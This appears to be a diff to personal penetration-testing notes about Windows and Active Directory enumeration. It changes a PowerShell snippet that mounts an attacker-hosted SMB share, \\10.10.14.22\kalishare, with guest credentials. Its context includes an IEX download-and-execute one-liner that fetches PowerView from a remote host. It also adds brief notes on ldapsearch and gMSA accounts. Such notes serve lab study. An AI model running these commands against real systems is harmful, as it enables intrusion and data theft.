@@ -55,9 +55,9 @@ once in rpc, enumdomusers, queryusergroups <user-rid(0x47b)>, querygroup <group-
 now on the windows powershell,
 
 ```
-$pass = convertto-securestring 'pass' -asplaintext -force
-$cred = new-object system.management.automation.pscredential('user', $pass)
-new-psdrive -name drivename -psprovider filesystem -credential $cred -root \\kalip\sharename
+$pass = convertto-securestring 'guest' -asplaintext -force
+$cred = new-object system.management.automation.pscredential('guest', $pass)
+new-psdrive -name kalidrive -psprovider filesystem -credential $cred -root \\10.10.14.22\kalishare
 ```
 
 #### Powerview
@@ -66,4 +66,11 @@ IEX(new-object net.webclient).downloadstring('http://$IP/PowerView.ps1') => this
 
 #### LDAPSEARCH
 
-ldapsearch 
+ldapsearch
+
+#### Group Managed Service Accounts - gMSA
+
+can be used on multiple hosts, scheduled tasks
+
+`gMSAs enable automatic password management across multiple computers using Kerberos KDC`
+
